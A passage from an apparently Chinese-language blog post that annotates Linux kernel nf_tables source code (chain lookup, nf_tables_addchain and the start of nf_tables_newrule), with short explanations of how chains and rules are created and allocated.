NF_DROP:</span><br><span class="line"><span class="keyword">case</span> NF_ACCEPT:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_CHAIN_FLAGS])</span><br><span class="line">flags = ntohl(nla_get_be32(nla[NFTA_CHAIN_FLAGS]));</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (chain)</span><br><span class="line">flags = chain-&gt;flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~NFT_CHAIN_FLAGS)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, chain, nla);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">flags |= chain-&gt;flags &amp; NFT_CHAIN_BASE;</span><br><span class="line"><span class="keyword">return</span> nf_tables_updchain(&amp;ctx, genmask, policy, flags, attr,</span><br><span class="line">  extack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nf_tables_addchain(&amp;ctx, family, genmask, policy, flags);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先通过<code>nft_table_lookup</code>函数来找到table，如果不存在则直接退出。</p><p>随后存在两种方式来找到chain，第一种是直接通过handle来进行对比找到，第二种则是通过名字在table的哈希表中找到。</p><p>在找到之后基本就是链和参数做判断，以及对常规链的一系列处理。</p><p>最终在<code>nf_tables_addchain</code>函数添加<code>chain</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_addchain</span><span class="params">(struct nft_ctx *ctx, u8 family, u8 genmask,</span></span></span><br><span class="line"><span class="params"><span class="function">      u8 policy, u32 flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">const</span> *<span class="title">nla</span> =</span> ctx-&gt;nla;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span> =</span> ctx-&gt;table;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_base_chain</span> *<span class="title">basechain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_stats</span> __<span class="title">percpu</span> *<span class="title">stats</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span> =</span> ctx-&gt;net;</span><br><span class="line"><span class="keyword">char</span> name[NFT_NAME_MAXLEN];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> **<span class="title">rules</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (table-&gt;use == UINT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_CHAIN_HOOK]) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain_hook</span> <span class="title">hook</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; NFT_CHAIN_BINDING)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">err = nft_chain_parse_hook(net, nla, &amp;hook, family, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">basechain = kzalloc(<span class="keyword">sizeof</span>(*basechain), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (basechain == <span class="literal">NULL</span>) &#123;</span><br><span class="line">nft_chain_release_hook(&amp;hook);</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br><span class="line">chain = &amp;basechain-&gt;chain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_CHAIN_COUNTERS]) &#123;</span><br><span class="line">stats = nft_stats_alloc(nla[NFTA_CHAIN_COUNTERS]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(stats)) &#123;</span><br><span class="line">nft_chain_release_hook(&amp;hook);</span><br><span class="line">kfree(basechain);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(stats);</span><br><span class="line">&#125;</span><br><span class="line">rcu_assign_pointer(basechain-&gt;stats, stats);</span><br><span class="line">static_branch_inc(&amp;nft_counters_enabled);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = nft_basechain_init(basechain, family, &amp;hook, flags);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">nft_chain_release_hook(&amp;hook);</span><br><span class="line">kfree(basechain);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; NFT_CHAIN_BASE)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; NFT_CHAIN_HW_OFFLOAD)</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">chain = kzalloc(<span class="keyword">sizeof</span>(*chain), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (chain == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">chain-&gt;flags = flags;</span><br><span class="line">&#125;</span><br><span class="line">ctx-&gt;chain = chain;</span><br><span class="line"></span><br><span class="line">INIT_LIST_HEAD(&amp;chain-&gt;rules);</span><br><span class="line">chain-&gt;handle = nf_tables_alloc_handle(table);</span><br><span class="line">chain-&gt;table = table;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_CHAIN_NAME]) &#123;</span><br><span class="line">chain-&gt;name = nla_strdup(nla[NFTA_CHAIN_NAME], GFP_KERNEL);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!(flags &amp; NFT_CHAIN_BINDING)) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> err_destroy_chain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">snprintf</span>(name, <span class="keyword">sizeof</span>(name), <span class="string">&quot;__chain%llu&quot;</span>, ++chain_id);</span><br><span class="line">chain-&gt;name = kstrdup(name, GFP_KERNEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!chain-&gt;name) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err_destroy_chain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_CHAIN_USERDATA]) &#123;</span><br><span class="line">chain-&gt;udata = nla_memdup(nla[NFTA_CHAIN_USERDATA], GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (chain-&gt;udata == <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err_destroy_chain;</span><br><span class="line">&#125;</span><br><span class="line">chain-&gt;udlen = nla_len(nla[NFTA_CHAIN_USERDATA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rules = nf_tables_chain_alloc_rules(chain, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!rules) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err_destroy_chain;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*rules = <span class="literal">NULL</span>;</span><br><span class="line">rcu_assign_pointer(chain-&gt;rules_gen_0, rules);</span><br><span class="line">rcu_assign_pointer(chain-&gt;rules_gen_1, rules);</span><br><span class="line"></span><br><span class="line">err = nf_tables_register_hook(net, table, chain);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err_destroy_chain;</span><br><span class="line"></span><br><span class="line">trans = nft_trans_chain_add(ctx, NFT_MSG_NEWCHAIN);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(trans)) &#123;</span><br><span class="line">err = PTR_ERR(trans);</span><br><span class="line"><span class="keyword">goto</span> err_unregister_hook;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_trans_chain_policy(trans) = NFT_CHAIN_POLICY_UNSET;</span><br><span class="line"><span class="keyword">if</span> (nft_is_base_chain(chain))</span><br><span class="line">nft_trans_chain_policy(trans) = policy;</span><br><span class="line"></span><br><span class="line">err = nft_chain_add(table, chain);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">nft_trans_destroy(trans);</span><br><span class="line"><span class="keyword">goto</span> err_unregister_hook;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">table-&gt;use++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err_unregister_hook:</span><br><span class="line">nf_tables_unregister_hook(net, table, chain);</span><br><span class="line">err_destroy_chain:</span><br><span class="line">nf_tables_chain_destroy(ctx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要通过用户态是否传递hook来分两种情况来分别创建基本链和常规链。</p><p>后续则是对其进行一系列初始化包括生成rules堆块。</p><h3 id="配置规则"><a href="#配置规则" class="headerlink" title="配置规则"></a>配置规则</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newrule</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">     struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nlattr * <span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">     struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfmsg</span> =</span> nlmsg_data(nlh);</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr_info</span> *<span class="title">info</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> family = nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_flow_rule</span> *<span class="title">flow</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> *<span class="title">rule</span>, *<span class="title">old_rule</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_userdata</span> *<span class="title">udata</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tmp</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size, i, n, ulen = <span class="number">0</span>, usize = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> err, rem;</span><br><span class="line">u64 handle, pos_handle;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;net-&gt;nft.commit_mutex);</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_RULE_TABLE], family, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_CHAIN]) &#123;</span><br><span class="line">chain = nft_chain_lookup(net, table, nla[NFTA_RULE_CHAIN],</span><br><span class="line"> genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_CHAIN]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nft_chain_is_bound(chain))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nla[NFTA_RULE_CHAIN_ID]) &#123;</span><br><span class="line">chain = nft_chain_lookup_byid(net, nla[NFTA_RULE_CHAIN_ID]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_CHAIN_ID]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_HANDLE]) &#123;</span><br><span class="line">handle = be64_to_cpu(nla_get_be64(nla[NFTA_RULE_HANDLE]));</span><br><span class="line">rule = __nft_rule_lookup(chain, handle);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(rule);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_EXCL) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> -EEXIST;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line">old_rule = rule;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!(nlh-&gt;nlmsg_flags &amp; NLM_F_CREATE) ||</span><br><span class="line">    nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">handle = nf_tables_alloc_handle(table);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain-&gt;use == UINT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EOVERFLOW;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_POSITION]) &#123;</span><br><span class="line">pos_handle = be64_to_cpu(nla_get_be64(nla[NFTA_RULE_POSITION]));</span><br><span class="line">old_rule = __nft_rule_lookup(chain, pos_handle);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(old_rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_POSITION]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(old_rule);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nla[NFTA_RULE_POSITION_ID]) &#123;</span><br><span class="line">old_rule = nft_rule_lookup_byid(net, nla[NFTA_RULE_POSITION_ID]);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(old_rule)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_RULE_POSITION_ID]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(old_rule);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_ctx_init(&amp;ctx, net, skb, nlh, family, table, chain, nla);</span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span>;</span><br><span class="line">size = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_EXPRESSIONS]) &#123;</span><br><span class="line">info = kvmalloc_array(NFT_RULE_MAXEXPRS,</span><br><span class="line">      <span class="keyword">sizeof</span>(struct nft_expr_info),</span><br><span class="line">      GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!info)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">nla_for_each_nested(tmp, nla[NFTA_RULE_EXPRESSIONS], rem) &#123;</span><br><span class="line">err = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (nla_type(tmp) != NFTA_LIST_ELEM)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line"><span class="keyword">if</span> (n == NFT_RULE_MAXEXPRS)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">err = nf_tables_expr_parse(&amp;ctx, tmp, &amp;info[n]);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line">size += info[n].ops-&gt;size;</span><br><span class="line">n++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Check for overflow of dlen field */</span></span><br><span class="line">err = -EFBIG;</span><br><span class="line"><span class="keyword">if</span> (size &gt;= <span class="number">1</span> &lt;&lt; <span class="number">12</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_RULE_USERDATA]) &#123;</span><br><span class="line">ulen = nla_len(nla[NFTA_RULE_USERDATA]);</span><br><span class="line"><span class="keyword">if</span> (ulen &gt; <span class="number">0</span>)</span><br><span class="line">usize = <span class="keyword">sizeof</span>(struct nft_userdata) + ulen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">err = -ENOMEM;</span><br><span class="line">rule = kzalloc(<span class="keyword">sizeof</span>(*rule) + size + usize, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (rule == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> err1;</span><br><span class="line"></span><br><span class="line">nft_activate_next(net, rule);</span><br><span class="line"></span><br><span class="line">rule-&gt;handle = handle;</span><br><span class="line">rule-&gt;dlen   = size;</span><br><span class="line">rule-&gt;udata  = ulen ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ulen) &#123;</span><br><span class="line">udata = nft_userdata(rule);</span><br><span class="line">udata-&gt;len = ulen - <span class="number">1</span>;</span><br><span class="line">nla_memcpy(udata-&gt;data, nla[NFTA_RULE_USERDATA], ulen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    expr = nft_expr_first(rule);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">err = nf_tables_newexpr(&amp;ctx, &amp;info[i], expr);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, info[i].attr);</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (info[i].ops-&gt;validate)</span><br><span class="line">nft_validate_state_update(net, NFT_VALIDATE_NEED);</span><br><span class="line"></span><br><span class="line">info[i].ops = <span class="literal">NULL</span>;</span><br><span class="line">expr = nft_expr_next(expr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nlh-&gt;nlmsg_flags &amp; NLM_F_REPLACE) &#123;</span><br><span class="line">trans = nft_trans_rule_add(&amp;ctx, NFT_MSG_NEWRULE, rule);</span><br><span class="line"><span class="keyword">if</span> (trans == <span class="literal">NULL</span>) &#123;</span><br><span class="line">err = -ENOMEM;</span><br><span class="line"><span class="keyword">goto</span> err2;</span><br><span class="line">&#125;</span><br><span class="line">err = nft_delrule(&amp;ctx, old_rule);</span><br><span class="line"><span 